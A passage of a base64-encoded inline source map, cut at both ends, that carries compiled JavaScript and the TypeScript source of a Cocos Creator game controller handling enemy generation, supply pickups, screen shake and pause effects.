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BSSxJQUFJLENBQUMsY0FBYyxHQUFHLENBQUMsRUFBQztZQUN4QixJQUFJLENBQUMsUUFBUSxFQUFFLENBQUM7U0FDbkI7SUFDTCxDQUFDO0lBblZEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxTQUFTLENBQUM7a0VBQ29CO0lBRzNDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxTQUFTLENBQUM7NkRBQ2U7SUFHdEM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzsyREFDYTtJQUcvQjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3FEQUNPO0lBR3pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7bURBQ0s7SUFHdkI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQztvREFDTTtJQUd4QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3FEQUNPO0lBR3pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7c0RBQ1E7SUFHMUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQztvREFDTTtJQUd4QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3FEQUNPO0lBR3pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7c0RBQ1E7SUFHMUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzt3REFDVTtJQW5DWCxjQUFjO1FBRGxDLE9BQU87T0FDYSxjQUFjLENBc1ZsQztJQUFELHFCQUFDO0NBdFZELEFBc1ZDLENBdFYyQyxFQUFFLENBQUMsU0FBUyxHQXNWdkQ7a0JBdFZvQixjQUFjIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi9HYW1lUHJveHlcIjtcclxuaW1wb3J0IEVuZW15IGZyb20gXCIuLi9lbnRpdGllcy9lbmVteS9FbmVteVwiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCB7U2hha2V9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZXh0ZW5kL1NoYWtlXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQge011c2ljfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2F1ZGlvL011c2ljXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEdhbWVDb250cm9sbGVyIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuICAgIEBwcm9wZXJ0eShjYy5BbmltYXRpb24pXHJcbiAgICBtb3JlRW5lbXlUaXBzQW5pbWF0aW9uOmNjLkFuaW1hdGlvbiA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkFuaW1hdGlvbilcclxuICAgIGJvc3NUaXBzQW5pbWF0aW9uOmNjLkFuaW1hdGlvbiA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBzdXBwbHlHdWlkZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBzaGFrZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICB0b3BOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgbGVmdE5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICByaWdodE5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBzdXBwbHlOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZ3JleU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBibG9ja05vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICByZWxpdmVOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZ2FtZU92ZXJOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuXHJcbiAgICBwcml2YXRlIF9nZW5lcmF0aW5nID0gZmFsc2U7XHJcblxyXG4gICAgcHJpdmF0ZSBfc2hha2VEdXJhdGlvbiA9IDA7XHJcblxyXG4gICAgb25DbGlja1N1cHBseShldmVudCxkYXRhKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuOAkGNsaWNr44CRIEdhbWVDb250cm9sbGVyU3VwcGx5XCIpXHJcblxyXG4gICAgICAgIHRoaXMuc3VwcGx5Tm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIGxldCBuZXdiaWVOb2RlID0gY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5nZXRDaGlsZEJ5TmFtZShcIm5ld2JpZU5vZGVcIik7XHJcbiAgICAgICAgaWYgKG5ld2JpZU5vZGUpe1xyXG4gICAgICAgICAgICBuZXdiaWVOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgV29ybGQuTXkubmV3Ymllcy5maW5pc2goXCJLaWxsRml2ZUVuZW15XCIpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBwbGF5RW50cnkoKXtcclxuICAgICAgICBsZXQgcHJvbWlzZXMgPSBbXTtcclxuICAgICAgICB0aGlzLnRvcE5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLnRvcE5vZGUueSA9IGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS5oZWlnaHQvMiArIDMwMDtcclxuICAgICAgICBsZXQgc3BlZWQgPSA3MDA7XHJcbiAgICAgICAgbGV0IGRpc3RhbmNlID0gdGhpcy50b3BOb2RlLnkgLSBjYy52aWV3LmdldFZpc2libGVTaXplKCkuaGVpZ2h0LzI7XHJcbiAgICAgICAgaWYgKGV4dC5pc0lwaG9uZVgpe1xyXG4gICAgICAgICAgICBkaXN0YW5jZSArPSA2NjtcclxuICAgICAgICB9XHJcbiAgICAgICAgcHJvbWlzZXMucHVzaCh0aGlzLnRvcE5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZUJ5KGRpc3RhbmNlL3NwZWVkLCBjYy52MigwLCAtZGlzdGFuY2UpKSkpO1xyXG4gICAgICAgIHRoaXMubGVmdE5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLmxlZnROb2RlLnggPSAtY2Mudmlldy5nZXRWaXNpYmxlU2l6ZSgpLndpZHRoLzItMjAwO1xyXG4gICAgICAgIHByb21pc2VzLnB1c2godGhpcy5sZWZ0Tm9kZS5ydW5BY3Rpb25Bd2FpdChjYy5tb3ZlVG8oTWF0aC5hYnMoLWNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC8yIC0gdGhpcy5sZWZ0Tm9kZS54KS9zcGVlZCwgY2MudjIoLWNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC8yLCB0aGlzLmxlZnROb2RlLnkpKSkpO1xyXG4gICAgICAgIHRoaXMucmlnaHROb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgdGhpcy5yaWdodE5vZGUueCA9IGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC8yKzIwMDtcclxuICAgICAgICBwcm9taXNlcy5wdXNoKHRoaXMucmlnaHROb2RlLnJ1bkFjdGlvbkF3YWl0KGNjLm1vdmVUbyhNYXRoLmFicyhjYy52aWV3LmdldFZpc2libGVTaXplKCkud2lkdGgvMiAtIHRoaXMucmlnaHROb2RlLngpL3NwZWVkLCBjYy52MihjYy52aWV3LmdldFZpc2libGVTaXplKCkud2lkdGgvMiwgdGhpcy5yaWdodE5vZGUueSkpKSlcclxuICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykudGhlbihyZXM9PntcclxuICAgICAgICAgICAgR2FtZVByb3h5LmVtaXQoR2FtZVByb3h5LkV2ZW50LlN0YXJ0R2FtZSk7XHJcbiAgICAgICAgICAgIHRoaXMuYmxvY2tOb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgdGhpcy5zdXBwbHlOb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuZ3JleU5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLmdyZXlOb2RlLm9wYWNpdHkgPSAwO1xyXG4gICAgICAgIHRoaXMucmVsaXZlTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLmdhbWVPdmVyTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLnRvcE5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5sZWZ0Tm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLnJpZ2h0Tm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLmJsb2NrTm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihHYW1lUHJveHkuRXZlbnQuU3RhcnRHZW5FbmVteSwgdGhpcy5zdGFydEdlbmVyYXRpbmcsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihHYW1lUHJveHkuRXZlbnQuU3RvcEdlbkVuZW15LCB0aGlzLnN0b3BHZW5lcmF0aW5nLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oR2FtZVByb3h5LkV2ZW50LktpbGxFbmVteSwgdGhpcy5vbktpbGxFbmVteSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5LaWxsUm9sZSwgdGhpcy5vbktpbGxSb2xlLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oR2FtZVByb3h5LkV2ZW50LlNsb3dHYW1lLCB0aGlzLm9uU2xvd0dhbWUsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihHYW1lUHJveHkuRXZlbnQuUGF1c2VHYW1lLCB0aGlzLm9uUGF1c2VHYW1lLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oR2FtZVByb3h5LkV2ZW50LlNoYWtlU2NyZWVuLCB0aGlzLm9uU2hha2VTY3JlZW4sIHRoaXMpO1xyXG4gICAgICAgIEdhbWVQcm94eS5HYW1lU2NlbmUgPSB0aGlzLm5vZGU7XHJcbiAgICAgICAgdGhpcy5wbGF5RW50cnkoKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGFydCgpe1xyXG4gICAgICAgIEdhbWVQcm94eS5sZXZlbCA9IFdvcmxkLlN0b3JhZ2UuZ2FtZUxldmVsO1xyXG4gICAgICAgIEdhbWVQcm94eS5zbG93R2FtZSA9IGZhbHNlO1xyXG4gICAgICAgIEdhbWVQcm94eS5wYXVzZUdhbWUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLl9wcmVEaXNwbGF5R3VuID0gTWF0aC5yYW5kb20oKSAqIDEwMCA+IDUwO1xyXG4gICAgICAgIEdhbWVQcm94eS5lbWl0KEdhbWVQcm94eS5FdmVudC5Jbml0R2FtZSk7XHJcbiAgICAgICAgdGhpcy5fcHJvcExpc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5Qcm9wKS5maWx0ZXIodmFsdWUgPT4gdmFsdWVbJ2lkJ10gIT0gNyAmJiB2YWx1ZVsnaWQnXSAhPSA4ICYmIHZhbHVlWydpZCddICE9IDEwICYmICh2YWx1ZVsndW5sb2NrJ10gPT0gMCB8fCBXb3JsZC5NeS5wcm9wSW5mby5iZVVzaW5nKHZhbHVlWydpZCddKSkpLm1hcCh2YWx1ZSA9PiB2YWx1ZVsnaWQnXSk7XHJcbiAgICAgICAgdGhpcy5fZ3Vuc0xpc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pLmZpbHRlcih2YWx1ZSA9PiB2YWx1ZVsnaWQnXSAhPSAxICYmIHZhbHVlWyd1bmxvY2snXSA8PSBXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbCkubWFwKHZhbHVlID0+IHZhbHVlWydpZCddKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICB0aGlzLm5vZGUub2ZmKEdhbWVQcm94eS5FdmVudC5TdGFydEdlbkVuZW15LCB0aGlzLnN0YXJ0R2VuZXJhdGluZywgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9mZihHYW1lUHJveHkuRXZlbnQuU3RvcEdlbkVuZW15LCB0aGlzLnN0b3BHZW5lcmF0aW5nLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub2ZmKEdhbWVQcm94eS5FdmVudC5LaWxsRW5lbXksIHRoaXMub25LaWxsRW5lbXksIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoR2FtZVByb3h5LkV2ZW50LktpbGxSb2xlLCB0aGlzLm9uS2lsbFJvbGUsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoR2FtZVByb3h5LkV2ZW50LlNsb3dHYW1lLCB0aGlzLm9uU2xvd0dhbWUsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoR2FtZVByb3h5LkV2ZW50LlBhdXNlR2FtZSwgdGhpcy5vblBhdXNlR2FtZSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9mZihHYW1lUHJveHkuRXZlbnQuU2hha2VTY3JlZW4sIHRoaXMub25TaGFrZVNjcmVlbiwgdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25TaGFrZVNjcmVlbihkdXJhdGlvbjpudW1iZXIsc3RyZW5ndGhfeDpudW1iZXIsc3RyZW5ndGhfeTpudW1iZXIpe1xyXG4gICAgICAgIGlmICh0aGlzLl9zaGFrZUR1cmF0aW9uIDw9IGR1cmF0aW9uKXtcclxuICAgICAgICAgICAgdGhpcy5fc2hha2VEdXJhdGlvbiA9IGR1cmF0aW9uO1xyXG4gICAgICAgICAgICB0aGlzLnNoYWtlTm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgICAgICB0aGlzLnNoYWtlTm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgIHRoaXMuc2hha2VOb2RlLnJ1bkFjdGlvbihTaGFrZS5jcmVhdGUoZHVyYXRpb24sIHN0cmVuZ3RoX3gsIHN0cmVuZ3RoX3kpKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25TbG93R2FtZShzbG93OmJvb2xlYW4pe1xyXG4gICAgICAgIC8vIHRoaXMudXBkYXRlR3JleSgpO1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUVuZW15c0NvbnRyb2xsZXInXS5hbGxBY3RpdmVFbmVteSgpLmZvckVhY2godmFsdWUgPT4gdmFsdWUuZ2FtZVNsb3cgPSBzbG93KTtcclxuICAgIH1cclxuXHJcbiAgICBvblBhdXNlR2FtZShwYXVzZTpib29sZWFuKXtcclxuICAgICAgICB0aGlzLnVwZGF0ZUdyZXkoKTtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVHcmV5KG9wYWNpdHk6bnVtYmVyID0gMTkwKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcInVwZGF0ZUdyZXk9PT5cIiwgR2FtZVByb3h5LnBhdXNlR2FtZSk7XHJcbiAgICAgICAgdGhpcy5ncmV5Tm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgIGlmIChHYW1lUHJveHkucGF1c2VHYW1lIHx8IEdhbWVQcm94eS5zbG93R2FtZSl7XHJcbiAgICAgICAgICAgIHRoaXMuZ3JleU5vZGUucnVuQWN0aW9uKGNjLmZhZGVUbygwLjMsIG9wYWNpdHkpKTtcclxuICAgICAgICAgICAgLy8gY2MudHdlZW4odGhpcy5ncmV5Tm9kZSlcclxuICAgICAgICAgICAgLy8gICAgIC50bygwLjMsIHsgb3BhY2l0eTogb3BhY2l0eSB9KVxyXG4gICAgICAgICAgICAvLyAgICAgLnN0YXJ0KCk7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICB0aGlzLmdyZXlOb2RlLm9w